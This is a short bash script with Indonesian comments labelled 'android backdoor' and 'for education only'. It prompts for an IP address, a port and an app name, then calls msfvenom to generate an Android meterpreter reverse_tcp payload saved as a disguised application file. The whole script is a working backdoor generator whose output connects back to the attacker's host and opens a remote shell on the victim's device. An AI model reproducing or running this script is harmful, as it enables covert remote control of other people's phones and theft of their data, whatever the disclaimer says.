#!/bin/bash
# backdoor android
# hanya untuk edukasi, jangan disalahgunakan.

payload="android/meterpreter/reverse_tcp"
read -p "Masukkan alamat ip address: " lhost
read -p "Masukkan port: " lport
read -p "Masukkan nama aplikasi untuk backdoor android: " nama_aplikasi
msfvenom -p "$payload"  LHOST="$lhost" LPORT="$lport" > "$nama_aplikasi"
